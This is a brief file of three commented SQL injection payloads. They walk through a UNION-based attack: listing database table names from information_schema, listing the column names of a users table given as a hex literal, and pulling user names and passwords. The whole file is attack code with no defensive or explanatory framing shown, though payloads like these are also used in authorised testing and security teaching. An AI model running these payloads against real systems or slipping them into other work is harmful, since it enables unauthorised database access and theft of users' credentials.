/* SQL payload for revealing database table names */
1 UNION SELECT table_name, NULL  FROM information_schema.tables  WHERE table_schema = database()#

/* SQL payload for revealing column names in the user table */
1 UNION SELECT column_name, NULL  FROM information_schema.columns  WHERE table_name = 0x7573657273#

/* SQL payload for extracting user login credentials */
1 UNION SELECT user, password FROM users#
